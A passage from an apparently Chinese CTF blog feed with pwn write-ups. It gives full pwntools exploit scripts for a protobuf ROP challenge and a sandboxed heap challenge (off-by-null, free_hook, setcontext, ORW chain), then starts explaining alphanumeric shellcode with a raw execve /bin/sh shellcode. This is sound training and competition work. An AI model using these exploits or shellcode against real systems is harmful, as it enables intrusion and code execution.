class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ctf_pb2<br>r = process(<span class="hljs-string">&#x27;protocol&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./protocol&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><br>pop_rdi=<span class="hljs-number">0x0000000000404982</span> <span class="hljs-comment"># pop rdi ; ret</span><br>pop_rsi=<span class="hljs-number">0x0000000000588bbe</span> <span class="hljs-comment"># pop rsi ; ret</span><br>pop_rdx=<span class="hljs-number">0x000000000040454f</span> <span class="hljs-comment"># pop rdx ; ret</span><br>pop_rax=<span class="hljs-number">0x00000000005bdb8a</span> <span class="hljs-comment"># pop rax ; ret</span><br><span class="hljs-comment">#syscall=0x0000000000403c99 # syscall</span><br>syscall=<span class="hljs-built_in">next</span>(elf.search(asm(<span class="hljs-string">&#x27;syscall\nret&#x27;</span>)))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(syscall))<br><span class="hljs-comment">#syscall=0x68f0a4</span><br>bss=<span class="hljs-number">0x81A2E0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">pd</span>):<br>    d=ctf_pb2.pwn()<br>    d.username=pd<br>    d.password=<span class="hljs-string">b&#x27;p&#x27;</span><br>    strs=d.SerializeToString()<br>    r.sendafter(<span class="hljs-string">b&#x27;Login: &#x27;</span>,strs)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gadget</span>(<span class="hljs-params">off,val,zero_byte=<span class="hljs-number">5</span></span>):<br>    <span class="hljs-keyword">if</span> val == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            s(<span class="hljs-string">b&#x27;a&#x27;</span>*(off+<span class="hljs-number">7</span>-i))<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(zero_byte):<br>        s(<span class="hljs-string">b&#x27;a&#x27;</span>*(off+<span class="hljs-number">7</span>-i))<br>    s(<span class="hljs-string">b&#x27;a&#x27;</span>*off+p64(val)[:(<span class="hljs-number">8</span>-zero_byte)])<br><br>gadget(<span class="hljs-number">0x1d0</span>,syscall)<br>gadget(<span class="hljs-number">0x1c8</span>,<span class="hljs-number">0</span>)<br>gadget(<span class="hljs-number">0x1c0</span>,pop_rdx)<br>gadget(<span class="hljs-number">0x1b8</span>,<span class="hljs-number">0</span>)<br>gadget(<span class="hljs-number">0x1b0</span>,pop_rsi)<br>gadget(<span class="hljs-number">0x1a8</span>,bss)<br>gadget(<span class="hljs-number">0x1a0</span>,pop_rdi)<br>gadget(<span class="hljs-number">0x198</span>,<span class="hljs-number">59</span>,<span class="hljs-number">7</span>)<br>gadget(<span class="hljs-number">0x190</span>,pop_rax)<br><br>gadget(<span class="hljs-number">0x188</span>,syscall)<br>gadget(<span class="hljs-number">0x180</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>)<br>gadget(<span class="hljs-number">0x178</span>,pop_rdx)<br>gadget(<span class="hljs-number">0x170</span>,bss)<br>gadget(<span class="hljs-number">0x168</span>,pop_rsi)<br>gadget(<span class="hljs-number">0x160</span>,<span class="hljs-number">0</span>)<br>gadget(<span class="hljs-number">0x158</span>,pop_rdi)<br>gadget(<span class="hljs-number">0x150</span>,<span class="hljs-number">0</span>)<br>gadget(<span class="hljs-number">0x148</span>,pop_rax)<br><br>d = ctf_pb2.pwn()<br>d.username = p32(<span class="hljs-number">0xdead</span>)<br>d.password = p32(<span class="hljs-number">0xbeef</span>)<br><span class="hljs-built_in">print</span>(d.SerializeToString())<br>strs=d.SerializeToString()<br><span class="hljs-comment">#debug()</span><br><span class="hljs-built_in">print</span>(strs)<br>r.sendafter(<span class="hljs-string">b&#x27;Login: &#x27;</span>,strs)<br><span class="hljs-comment">#debug()</span><br>sleep(<span class="hljs-number">1</span>) <span class="hljs-comment">#need to sleep ,or might be EOF</span><br>r.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="sandboxheap">sandboxheap</h2><p>open与 （read和write）不能同时使用</p><p>用0x10000的功能去使用open</p><p>接着alarm软中断，</p><p>再用read，write就读出flag了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./sandboxheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    <span class="hljs-comment">#r = process(local_file)</span><br>    r = process(argv = [<span class="hljs-string">&#x27;./sandbox&#x27;</span>, local_file])<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;101.201.71.136&#x27;</span>, <span class="hljs-number">23712</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims          :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-comment">#------------------------------</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<span class="hljs-comment">#0~6</span><br>    add(i,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x28</span>)<br><br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">12</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-number">0x28</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br>edit(<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">0x38</span>+<span class="hljs-string">&#x27;0&#x27;</span>)<br><br>edit(<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">4</span>)<br><br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">12</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0xa0</span>)<br>show(<span class="hljs-number">10</span>)<br>libc_base=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span><br>info(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]+libc_base<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]+libc_base<br>info(<span class="hljs-string">&#x27;free_hook&#x27;</span>,free_hook)<br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x18</span>)<span class="hljs-comment">#10</span><br>delete(<span class="hljs-number">14</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">intToBit</span>(<span class="hljs-params">n</span>):<br>        bits = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> n&gt;<span class="hljs-number">0</span>:<br>            bits = <span class="hljs-built_in">str</span>(n%<span class="hljs-number">2</span>) + bits<br>            n = n//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(bits)!=<span class="hljs-number">8</span>:<br>            bits = <span class="hljs-string">&quot;0&quot;</span>+bits<br>        <span class="hljs-keyword">return</span> bits<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bitToInt</span>(<span class="hljs-params">n</span>):<br>        <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(n)):<br>            <span class="hljs-built_in">sum</span> += <span class="hljs-built_in">int</span>(n[i])*<span class="hljs-number">2</span>**(<span class="hljs-built_in">len</span>(n)-i-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverseBits</span>(<span class="hljs-params">n</span>):<br>        <span class="hljs-keyword">if</span> n==<span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>        bits = intToBit(n)<br>        <span class="hljs-keyword">return</span> bitToInt(bits[::-<span class="hljs-number">1</span>])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">n</span>):<br>    n8=(n/(<span class="hljs-number">0x100000000000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n7=(n/(<span class="hljs-number">0x1000000000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n6=(n/(<span class="hljs-number">0x10000000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n5=(n/(<span class="hljs-number">0x100000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n4=(n/(<span class="hljs-number">0x1000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n3=(n/(<span class="hljs-number">0x10000</span>))&amp;<span class="hljs-number">0xff</span><br>    n2=(n/(<span class="hljs-number">0x100</span>))&amp;<span class="hljs-number">0xff</span><br>    n1=(n/<span class="hljs-number">0x1</span>)&amp;<span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> ((<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n1))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n2))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n3))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n4))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n5))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n6))[<span class="hljs-number">2</span>:])).rjust(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;0&#x27;</span>)+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n7))[<span class="hljs-number">2</span>:])).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>)+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n8))[<span class="hljs-number">2</span>:])).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))<br><br><span class="hljs-comment">#print(hex(reverseBits(0x7f)))</span><br>setcontext=libc_base+libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]+<span class="hljs-number">53</span><br><br><br>edit(<span class="hljs-number">10</span>,change(<span class="hljs-number">0x6161616161616161</span>))<br>show(<span class="hljs-number">10</span>)<br>ru(<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>heap_base=uu64(rc(<span class="hljs-number">6</span>))-<span class="hljs-number">0xa10</span>+<span class="hljs-number">0xa00</span><br>info(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><br>edit(<span class="hljs-number">10</span>,change(free_hook))<br><br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x18</span>)<br><br><br>add(<span class="hljs-number">15</span>,<span class="hljs-number">0x18</span>)<br><br>edit(<span class="hljs-number">15</span>,change(setcontext)  ) <br>pop_rdi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>)))<br>pop_rsi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>)))<br>pop_rdx = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdx\nret&#x27;</span>)))<br>pop_rax = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>)))<br>syscall = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;syscall\nret&#x27;</span>)))<br>ret = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;ret&#x27;</span>)))<br>read=libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]+libc_base<br>write=libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]+libc_base<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(pop_rdi))<br><br>edit(<span class="hljs-number">13</span>,change(<span class="hljs-number">0x67616c66</span>))<br>flag_addr=heap_base+<span class="hljs-number">0x800</span><br><br><br><span class="hljs-comment">#orw=change(pop_rax)+&#x27;01010000&#x27;+&#x27;0&#x27;*8*7+change(pop_rdi)+change(heap_base)+change(pop_rsi)+&#x27;00000000&#x27;+&#x27;00000010&#x27;+&#x27;0&#x27;*8*6+change(pop_rdx)+&#x27;11100000&#x27;+&#x27;0&#x27;*8*7+change(syscall)+change(heap_base+0x880)</span><br><span class="hljs-comment">#orw+=change(0x622fbf4856f63148)+&#x27;10010110&#x27;+&#x27;01110110&#x27;+&#x27;11110100&#x27;+&#x27;11110100&#x27;+&#x27;11001110&#x27;+&#x27;00010110&#x27;+&#x27;11101010&#x27;+&#x27;00101010&#x27;+&#x27;11111010&#x27;+&#x27;01010110&#x27;+&#x27;11011100&#x27;+&#x27;00011010&#x27;+&#x27;10011001&#x27;+&#x27;11110000&#x27;+&#x27;10100000&#x27;+&#x27;00000000&#x27;</span><br><br>orw=change(pop_rdi)+<span class="hljs-string">&#x27;11000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rax)+<span class="hljs-string">&#x27;00001000&#x27;</span>+<span class="hljs-string">&#x27;11100100&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">6</span>+change(syscall)<br>orw+=change(pop_rdi)+change(flag_addr)+change(pop_rsi)+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">8</span>+change(pop_rax)+<span class="hljs-string">&#x27;01000000&#x27;</span>+<span class="hljs-string">&#x27;00000000&#x27;</span>*<span class="hljs-number">7</span>+change(syscall)<br>orw+=change(pop_rdi)+<span class="hljs-string">&#x27;01000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rax)+<span class="hljs-string">&#x27;10100100&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(syscall)<br>orw+=change(pop_rdi)+<span class="hljs-string">&#x27;11000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rsi)+change(flag_addr)+change(pop_rdx)+<span class="hljs-string">&#x27;00001010&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rax)+<span class="hljs-string">&#x27;00000000&#x27;</span>+<span class="hljs-string">&#x27;00000000&#x27;</span>*<span class="hljs-number">7</span>+change(syscall)<br>orw+=change(pop_rdi)+<span class="hljs-string">&#x27;10000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rsi)+change(flag_addr)+change(pop_rdx)+<span class="hljs-string">&#x27;00001010&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(write)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x198</span>)<br>edit(<span class="hljs-number">1</span>,orw)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x198</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">0xa0</span>+change(heap_base+<span class="hljs-number">0x820</span>+<span class="hljs-number">0x10</span>)+change(ret))<br><span class="hljs-comment">#debug()</span><br>delete(<span class="hljs-number">2</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/sandboxflag.png" alt="sandboxflag"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>off by null</tag>
      
      <tag>IO_leak</tag>
      
      <tag>fastbin reverse into tcache</tag>
      
      <tag>rop</tag>
      
      <tag>orw</tag>
      
      <tag>ret2setconext</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF X GFCTF 2022十月挑战赛pwn</title>
    <link href="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="前言：">前言：</h2><p>因为实在是太菜，所以一题都没做出来，跟着<a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247502987&amp;idx=1&amp;sn=39df1e5a1638db91f716f975fbeb69c1&amp;chksm=fbf456fbcc83dfedf587a21112de8e6fae17942e848974c5eafd827ab94af9d65aa87bef424b&amp;mpshare=1&amp;scene=23&amp;srcid=1025bRDnAZQ3o5bMtZAgFHMu&amp;sharer_sharetime=1666699678887&amp;sharer_shareid=600395608e88237687e56b1c66678009#rd">官方wp</a>复现一下</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/rank.png" alt="rank"></p><h2 id="1-5">1!5!</h2><h3 id="0x01-确定汇编">0x01 确定汇编</h3><p>题目限制输入指定明文字符15aABCDEFGHIJKLMNOPQRSUVWXYZ，且长度要刚好0x200</p><p>先确定能还用什么汇编</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#\x31\x35\x61\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x55\x56\x57\x58\x59\x5A</span><br>push:<br>    \x50 P  push   rax<br>    \x51        Q             push   rcx<br>    \x52        R             push   rdx<br>    \x53        S             push   rbx<br>    \x55        U             push   rbp<br>    \x56        V             push   rsi<br>    \x57        W             push   rdi<br>    \x41\x50---&gt;\x41\x57  push r8---&gt;push r15<br>pop:<br>    \x58        X             pop    rax<br>    \x59        Y             pop    rcx<br>    \x5a        Z             pop    rdx<br>    \x41\x58AX    pop    r8<br>    \x41\x59AY  pop    r9<br>    \x41\x5aAZ  pop    r10<br>xor:<br>    \x35xxxx5XXXXxor    eax,xxxx<br>    \x31\x31 xor    DWORD PTR [rcx], esi<br>    <br>    \x31xy1xy(x决定两个寄存器，y决定立即数) <br>    xor    DWORD PTR [寄存器+立即数], 寄存器<br>    例：<br>    \x31\x61\x31xor    DWORD PTR [rcx+<span class="hljs-number">0x31</span>], esp<br>    \x31\x41\x35xor    DWORD PTR [rcx+<span class="hljs-number">0x35</span>], eax<br></code></pre></td></tr></table></figure><p><code>xor eax,xxxx</code>可以异或出小于0x7f的字节</p><p>（限制字符的范围小于0x5a，二进制最高位只能为0，异或同为零，所以最大只能造出0x7f即<code>01111111</code>）</p><p><code>xor DWORD PTR [寄存器+立即数], eax</code>可以把值写入指定位置</p><p>配合<code>push</code>，<code>pop</code>等命令加上残留在<code>rdx</code>寄存器上的<code>0x10000</code>地址，可以在<code>0x10000</code>往后的地址写入小于<code>0x7f</code>字节的值，去当作命令执行</p><p>我们可以使用小于0x7f的命令，即可用一些如<code>sub byte [rax+1],cl</code>这些命令，来造出大于<code>0x7f</code>的值</p><h3 id="0x02-小于0x7f指令，写入shellcode">0x02 小于0x7f指令，写入shellcode</h3><p>我们最终目的是写shellcode当作命令执行，</p><p>我这里找了个<code>64位 较短的shellcode  23字节</code></p><p><code>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</code></p><p>有三个字节大于0x7f</p><p>小于<code>0x7f</code>的字节就用小于0x7f的命令正常写入<code>0x10000+0x200</code>后的地址，大于0x7f的三个字节由<code>sub byte 